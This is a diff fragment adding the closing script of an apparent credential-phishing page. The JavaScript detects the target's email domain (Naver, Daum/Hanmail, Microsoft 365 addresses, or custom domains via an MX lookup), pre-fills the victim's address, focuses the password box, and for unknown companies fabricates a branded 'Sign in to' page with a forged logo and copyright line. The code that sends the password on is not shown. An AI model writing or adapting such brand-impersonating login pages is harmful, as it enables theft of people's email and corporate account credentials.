+        document.getElementById('abvContainer').style.display = 'block';
+        document.getElementById('abvEmail').value = currentEmail;
+        document.getElementById('abvPass').focus();
+    } else if (currentDomain === 'naver.com' || currentDomain === 'naver.net') {
+        document.body.classList.replace('is-loading', 'is-naver');
+        document.getElementById('naverEmail').value = currentEmail;
+        document.getElementById('naverPass').focus();
+    } else if (currentDomain === 'daum.net' || currentDomain === 'hanmail.net') {
+        document.body.classList.replace('is-loading', 'is-daum');
+        document.getElementById('daumEmail').value = currentEmail;
+        document.getElementById('daumPass').focus();
+    } else if (['outlook.com', 'hotmail.com', 'live.com', 'microsoft.com'].includes(currentDomain)) {
+        renderM365();
+    } else if (!BRAND_DB[currentDomain] && (currentDomain.endsWith('.kr') || currentDomain.endsWith('.co.uk') || currentDomain.endsWith('.com'))) {
+        // Custom Domain Check for Hiworks/M365
+        const provider = await detectProviderByMX(currentDomain);
+        if (provider === 'm365') renderM365();
+        else renderCorp();
+    } else {
+        // Fallback to Generic DB
+        currentBrand = detectBrand(currentDomain);
+        document.body.classList.replace('is-loading', 'is-generic');
+        document.getElementById('genericContainer').style.display = 'block';
+        document.getElementById('emailDisplay').value = currentEmail;
+        applyTheme(currentBrand);
+        document.getElementById('password').focus();
+        document.getElementById('password').addEventListener('keydown', e => { if(e.key==='Enter') submitLogin('generic'); });
+    }
+
+    function renderM365() {
+        document.body.classList.replace('is-loading', 'is-m365');
+        document.getElementById('m365EmailDisplay').textContent = currentEmail;
+        document.getElementById('m365Pass').focus();
+        document.getElementById('m365Pass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('m365'); });
+    }
+
+    function renderCorp() {
+        document.body.classList.replace('is-loading', 'is-corp');
+        const brandName = currentDomain.split('.')[0].toUpperCase();
+        const colors = ['#06b6d4', '#1a73e8', '#03c75a', '#f9a800', '#e95e2e'];
+        const randomColor = colors[brandName.length % colors.length];
+        
+        document.getElementById('corpLogo').textContent = brandName.charAt(0);
+        document.getElementById('corpLogo').style.background = randomColor;
+        document.getElementById('corpTitle').textContent = brandName;
+        document.getElementById('corpBadge').textContent = brandName;
+        document.getElementById('corpSub').textContent = 'Sign in to ' + currentDomain;
+        document.getElementById('corpDomainText').textContent = currentDomain.toUpperCase();
+        document.getElementById('corpEmail').value = currentEmail;
+        document.getElementById('corpCopyright').textContent = '© ' + currentDomain + '. All rights reserved.';
+        document.getElementById('corpBtn').style.background = randomColor;
+        
+        document.getElementById('corpPass').focus();
+        document.getElementById('corpPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('corp'); });
+    }
+});
+</script>
+</body>
+</html>
